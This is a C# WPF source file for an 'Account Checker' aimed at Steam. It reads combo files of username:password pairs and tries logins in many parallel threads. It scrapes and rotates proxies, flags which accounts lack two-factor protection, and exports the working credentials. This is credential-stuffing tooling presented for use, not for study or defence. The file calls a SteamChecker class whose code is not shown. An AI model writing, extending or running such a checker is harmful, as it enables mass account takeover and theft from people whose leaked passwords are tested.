using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Animation;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using Microsoft.Win32;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Linq;

namespace AccountChecker;

/// <summary>
/// Interaction logic for MainWindow.xaml
/// </summary>
public partial class MainWindow : Window
{
    private CancellationTokenSource? _cancellationTokenSource;
    private List<string> _accounts = new();
    private int _validCount = 0;
    private int _invalidCount = 0;
    private int _checkedCount = 0;
    private int _mfaCount = 0;
    private List<string> _validAccounts = new();
    private List<string> _invalidAccounts = new();
    private List<string> _mfaAccounts = new();
    private List<string> _proxies = new();
    private bool _useProxyless = true;
    private bool _isLoadingProxies = false;
    private int _currentProxyIndex = 0;
    private readonly object _proxyLock = new object();
    private bool _isChecking = false;
    private bool _isPaused = false;
    private int _currentAccountIndex = 0;
    
    public MainWindow()
    {
        InitializeComponent();
        
        // Start fade-in animation for first tab
        Loaded += (s, e) => AnimateTabContent(SteamCheckerContent);
    }

    private void TitleBar_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
    {
        if (e.ClickCount == 2)
        {
            WindowState = WindowState == WindowState.Maximized ? WindowState.Normal : WindowState.Maximized;
        }
        else
        {
            DragMove();
        }
    }

    private void MinimizeButton_Click(object sender, RoutedEventArgs e)
    {
        WindowState = WindowState.Minimized;
    }

    private void MaximizeButton_Click(object sender, RoutedEventArgs e)
    {
        WindowState = WindowState == WindowState.Maximized ? WindowState.Normal : WindowState.Maximized;
    }

    private void CloseButton_Click(object sender, RoutedEventArgs e)
    {
        Close();
    }

    private void TabControl_SelectionChanged(object sender, SelectionChangedEventArgs e)
    {
        if (e.Source is TabControl)
        {
            var selectedTab = (TabItem)MainTabControl.SelectedItem;
            if (selectedTab?.Content is Grid grid)
            {
                AnimateTabContent(grid);
            }
        }
    }

    private void AnimateTabContent(Grid content)
    {
        var storyboard = new Storyboard();

        // Fade in animation
        var fadeIn = new DoubleAnimation
        {
            From = 0,
            To = 1,
            Duration = TimeSpan.FromMilliseconds(500),
            EasingFunction = new CubicEase { EasingMode = EasingMode.EaseOut }
        };
        Storyboard.SetTarget(fadeIn, content);
        Storyboard.SetTargetProperty(fadeIn, new PropertyPath("Opacity"));

        // Slide up animation
        var slideUp = new DoubleAnimation
        {
            From = 20,
            To = 0,
            Duration = TimeSpan.FromMilliseconds(500),
            EasingFunction = new CubicEase { EasingMode = EasingMode.EaseOut }
        };
        Storyboard.SetTarget(slideUp, content);
        Storyboard.SetTargetProperty(slideUp, new PropertyPath("(UIElement.RenderTransform).(TranslateTransform.Y)"));

        storyboard.Children.Add(fadeIn);
        storyboard.Children.Add(slideUp);
        storyboard.Begin();
    }

    private void BrowseComboFile_Click(object sender, RoutedEventArgs e)
    {
        var dialog = new OpenFileDialog
        {
            Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*",
            Title = "Select Combo File"
        };

        if (dialog.ShowDialog() == true)
        {
            ComboFileTextBox.Text = dialog.FileName;
            LoadAccounts(dialog.FileName);
        }
    }

    private void LoadAccounts(string filePath)
    {
        try
        {
            _accounts = File.ReadAllLines(filePath).Where(line => !string.IsNullOrWhiteSpace(line)).ToList();
            TotalCount.Text = _accounts.Count.ToString();
            ResetStats();
        }
        catch (Exception ex)
        {
            MessageBox.Show($"Error loading file: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
        }
    }

    private void ResetStats()
    {
        _validCount = 0;
        _invalidCount = 0;
        _checkedCount = 0;
        _mfaCount = 0;
        
        ValidCount.Text = "0";
        InvalidCount.Text = "0";
        CheckedCount.Text = "0";
        MfaCount.Text = "0";
        ResultsListBox.Items.Clear();
        
        _validAccounts.Clear();
        _invalidAccounts.Clear();
        _mfaAccounts.Clear();
    }

    private async void StartStopButton_Click(object sender, RoutedEventArgs e)
    {
        if (_isChecking && !_isPaused)
        {
            // Pause checking
            _isPaused = true;
            StartStopButton.Content = "RESUME";
            StatusTextBlock.Text = "Paused - Click RESUME to continue or STOP to cancel";
        }
        else if (_isPaused)
        {
            // Resume checking
            _isPaused = false;
            StartStopButton.Content = "PAUSE";
            StatusTextBlock.Text = "Checking...";
        }
        else
        {
            // Start checking
            if (_accounts.Count == 0)
            {
                MessageBox.Show("Please load a combo file first!", "Warning", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            if (!int.TryParse(ThreadsTextBox.Text, out int threads) || threads < 1)
            {
                MessageBox.Show("Please enter a valid thread count!", "Warning", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            _isChecking = true;
            _isPaused = false;
            _currentAccountIndex = 0;
            StartStopButton.Content = "PAUSE";
            StopButton.IsEnabled = true;
            
            _cancellationTokenSource = new CancellationTokenSource();
            ResetStats();

            try
            {
                await CheckAccounts(threads, _cancellationTokenSource.Token);
                StatusTextBlock.Text = "Checking complete!";
            }
            catch (OperationCanceledException)
            {
                StatusTextBlock.Text = "Checking stopped by user";
            }
            catch (Exception ex)
            {
                StatusTextBlock.Text = $"Error: {ex.Message}";
            }
            finally
            {
                _isChecking = false;
                _isPaused = false;
                StartStopButton.Content = "START";
                StopButton.IsEnabled = false;
            }
        }
    }

    private void StopButton_Click(object sender, RoutedEventArgs e)
    {
        // Completely stop checking
        _cancellationTokenSource?.Cancel();
        StopButton.IsEnabled = false;
        StatusTextBlock.Text = "Stopping... Please wait for running checks to finish";
    }

    private async Task CheckAccounts(int threadCount, CancellationToken cancellationToken)
    {
        var semaphore = new SemaphoreSlim(threadCount);
        var tasks = new List<Task>();

        try
        {
            for (int i = _currentAccountIndex; i < _accounts.Count; i++)
            {
                // Wait while paused
                while (_isPaused && !cancellationToken.IsCancellationRequested)
                {
                    try
                    {
                        await Task.Delay(100, cancellationToken);
                    }
                    catch (TaskCanceledException)
                    {
                        break;
                    }
                }

                if (cancellationToken.IsCancellationRequested)
                    break;

                var account = _accounts[i];
                _currentAccountIndex = i + 1;

                try
                {
                    await semaphore.WaitAsync(cancellationToken);
                }
                catch (OperationCanceledException)
                {
                    break;
                }

                var task = Task.Run(async () =>
                {
                    try
                    {
                        if (!cancellationToken.IsCancellationRequested)
                        {
                            await CheckSteamAccount(account, cancellationToken);
                        }
                    }
                    catch (OperationCanceledException)
                    {
                        // Silently catch cancellation
                    }
                    catch (Exception)
                    {
                        // Silently catch other exceptions during cancellation
                    }
                    finally
                    {
                        semaphore.Release();
                    }
                }, cancellationToken);

                tasks.Add(task);
            }

            try
            {
                await Task.WhenAll(tasks);
            }
            catch (OperationCanceledException)
            {
                // Expected when cancelled
            }
        }
        catch (OperationCanceledException)
        {
            // Expected when cancelled
        }
    }

    private async Task CheckSteamAccount(string account, CancellationToken cancellationToken)
    {
        if (cancellationToken.IsCancellationRequested)
            return;

        await Task.Run(() =>
        {
            try
            {
                var parts = account.Split(':');
                if (parts.Length < 2)
                    return;

                string username = parts[0];
                string password = parts[1];

                // Use real Steam checker (no proxy support for Steam protocol)
                var steamChecker = new SteamChecker(username, password);
                var checkedAccount = steamChecker.Account;

                if (cancellationToken.IsCancellationRequested)
                    return;

                // Handle null account (connection failure)
                if (checkedAccount == null)
                {
                    Dispatcher.Invoke(() =>
                    {
                        _checkedCount++;
                        _invalidCount++;
                        CheckedCount.Text = _checkedCount.ToString();
                        InvalidCount.Text = _invalidCount.ToString();
                        _invalidAccounts.Add(account);

                        var item = new ListBoxItem
                        {
                            Content = $"[ERROR] {account} - Connection failed",
                            Foreground = new SolidColorBrush(Color.FromRgb(244, 67, 54))
                        };
                        ResultsListBox.Items.Insert(0, item);
                    });
                    return;
                }

                Dispatcher.Invoke(() =>
                {
                    _checkedCount++;
                    CheckedCount.Text = _checkedCount.ToString();

                    string statusText;
                    Color statusColor;

                    if (checkedAccount.Type == Status.Success)
                    {
                        _validCount++;
                        ValidCount.Text = _validCount.ToString();
                        _validAccounts.Add(account);
                        statusText = $"[VALID | NO MFA] {account} | SteamID: {checkedAccount.Id}";
                        statusColor = Color.FromRgb(255, 193, 7); // Yellow/Orange
                    }
                    else if (checkedAccount.Type == Status.SteamGuardProtected)
                    {
                        _mfaCount++;
                        MfaCount.Text = _mfaCount.ToString();
                        _mfaAccounts.Add(account);
                        statusText = $"[VALID | MFA ENABLED] {account} | SteamID: {checkedAccount.Id}";
                        statusColor = Color.FromRgb(255, 165, 0); // Orange
                    }
                    else
                    {
                        _invalidCount++;
                        InvalidCount.Text = _invalidCount.ToString();
                        _invalidAccounts.Add(account);
                        statusText = $"[INVALID] {account}";
                        statusColor = Color.FromRgb(244, 67, 54); // Red
                    }

                    var item = new ListBoxItem
                    {
                        Content = statusText,
                        Foreground = new SolidColorBrush(statusColor)
                    };
                    ResultsListBox.Items.Insert(0, item);

                    // Auto-scroll to top
                    if (ResultsListBox.Items.Count > 0)
                    {
                        ResultsListBox.ScrollIntoView(ResultsListBox.Items[0]);
                    }
                });
            }
            catch (Exception ex)
            {
                Dispatcher.Invoke(() =>
                {
                    _checkedCount++;
                    _invalidCount++;
                    CheckedCount.Text = _checkedCount.ToString();
                    InvalidCount.Text = _invalidCount.ToString();
                    _invalidAccounts.Add(account);

                    var item = new ListBoxItem
                    {
                        Content = $"[ERROR] {account} - {ex.Message}",
                        Foreground = new SolidColorBrush(Color.FromRgb(244, 67, 54))
                    };
                    ResultsListBox.Items.Insert(0, item);
                });
            }
        }, cancellationToken);
    }

    private void ProxylessCheckBox_Changed(object sender, RoutedEventArgs e)
    {
        _useProxyless = ProxylessCheckBox.IsChecked == true;
        
        // Null checks to prevent errors during initialization
        if (ProxyFileLabel != null)
            ProxyFileLabel.IsEnabled = !_useProxyless;
        if (ProxyFileTextBox != null)
            ProxyFileTextBox.IsEnabled = !_useProxyless;
        if (BrowseProxyButton != null)
            BrowseProxyButton.IsEnabled = !_useProxyless;
        
        if (_useProxyless && ProxyFileTextBox != null && ProxyStatsPanel != null)
        {
            ProxyFileTextBox.Text = "";
            ProxyStatsPanel.Visibility = Visibility.Collapsed;
            _proxies.Clear();
        }
    }

    private void BrowseProxyFile_Click(object sender, RoutedEventArgs e)
    {
        var dialog = new OpenFileDialog
        {
            Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*",
            Title = "Select Proxy File"
        };

        if (dialog.ShowDialog() == true)
        {
            ProxyFileTextBox.Text = dialog.FileName;
            LoadProxies(dialog.FileName);
        }
    }

    private void LoadProxies(string filePath)
    {
        try
        {
            _proxies = File.ReadAllLines(filePath).Where(line => !string.IsNullOrWhiteSpace(line)).ToList();
            ProxyCountText.Text = _proxies.Count.ToString();
            ProxyStatsPanel.Visibility = Visibility.Visible;
        }
        catch (Exception ex)
        {
            MessageBox.Show($"Error loading proxy file: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
        }
    }

    private async Task LoadFreeProxiesAsync()
    {
        if (_isLoadingProxies)
            return;

        _isLoadingProxies = true;
        
        try
        {
            // Show loading message
            Dispatcher.Invoke(() =>
            {
                StatusTextBlock.Text = "Loading free proxies from APIs...";
            });

            // Scrape proxies from free APIs
            var scrapedProxies = await ProxyManager.ScrapeProxiesAsync();
            
            if (scrapedProxies.Count == 0)
            {
                MessageBox.Show("Failed to load proxies from free APIs!", "Warning", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            Dispatcher.Invoke(() =>
            {
                StatusTextBlock.Text = $"Validating {scrapedProxies.Count} proxies... This may take a moment.";
            });

            // Validate proxies (test first 200 for speed)
            var proxiesToValidate = scrapedProxies.Take(200).ToList();
            var validProxies = await ProxyManager.ValidateProxiesAsync(proxiesToValidate, 50);

            if (validProxies.Count == 0)
            {
                MessageBox.Show("No valid proxies found! Using direct connection.", "Warning", MessageBoxButton.OK, MessageBoxImage.Warning);
            }
            else
            {
                _proxies = validProxies;
                Dispatcher.Invoke(() =>
                {
                    ProxyCountText.Text = _proxies.Count.ToString();
                    ProxyStatsPanel.Visibility = Visibility.Visible;
                    StatusTextBlock.Text = $"Loaded {_proxies.Count} valid proxies!";
                });
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show($"Error loading proxies: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
        }
        finally
        {
            _isLoadingProxies = false;
        }
    }

    private string GetNextProxy()
    {
        if (_proxies.Count == 0)
            return string.Empty;

        lock (_proxyLock)
        {
            var proxy = _proxies[_currentProxyIndex];
            _currentProxyIndex = (_currentProxyIndex + 1) % _proxies.Count;
            return proxy;
        }
    }

    private void ExportResults_Click(object sender, RoutedEventArgs e)
    {
        if (_validAccounts.Count == 0 && _invalidAccounts.Count == 0)
        {
            MessageBox.Show("No results to export!", "Warning", MessageBoxButton.OK, MessageBoxImage.Warning);
            return;
        }

        var dialog = new Microsoft.Win32.SaveFileDialog
        {
            Filter = "Text Files (*.txt)|*.txt",
            FileName = $"steam_results_{DateTime.Now:yyyyMMdd_HHmmss}.txt",
            Title = "Export Results"
        };

        if (dialog.ShowDialog() == true)
        {
            try
            {
                var lines = new List<string>();
                lines.Add($"===== STEAM ACCOUNT CHECKER RESULTS =====");
                lines.Add($"Date: {DateTime.Now}");
                lines.Add($"Total Checked: {_checkedCount}");
                lines.Add($"Valid: {_validCount}");
                lines.Add($"Invalid: {_invalidCount}");
                lines.Add($"MFA Enabled: {_mfaCount}");
                lines.Add("");
                
                if (_validAccounts.Count > 0)
                {
                    lines.Add("===== VALID ACCOUNTS =====");
                    lines.AddRange(_validAccounts);
                    lines.Add("");
                }
                
                if (_mfaAccounts.Count > 0)
                {
                    lines.Add("===== MFA ENABLED ACCOUNTS =====");
                    lines.AddRange(_mfaAccounts);
                    lines.Add("");
                }
                
                if (_invalidAccounts.Count > 0)
                {
                    lines.Add("===== INVALID ACCOUNTS =====");
                    lines.AddRange(_invalidAccounts);
                }
                
                File.WriteAllLines(dialog.FileName, lines);
                MessageBox.Show($"Results exported successfully!\n{dialog.FileName}", "Success", MessageBoxButton.OK, MessageBoxImage.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error exporting results: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }
    }


    
}
